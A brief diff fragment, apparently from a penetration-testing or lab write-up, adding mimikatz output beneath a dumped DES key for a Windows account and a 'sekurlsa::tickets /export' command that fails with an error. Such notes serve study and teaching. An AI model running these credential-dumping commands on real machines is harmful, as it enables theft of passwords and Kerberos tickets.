@@ -113,6 +113,9 @@ Supplemental Credentials:
     Default Salt : WDAGUtilityAccount
     Credentials
       des_cbc_md5       : eca497e5c275648c
+      
+mimikatz # sekurlsa::tickets /export
+ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
 ```
 
 ---
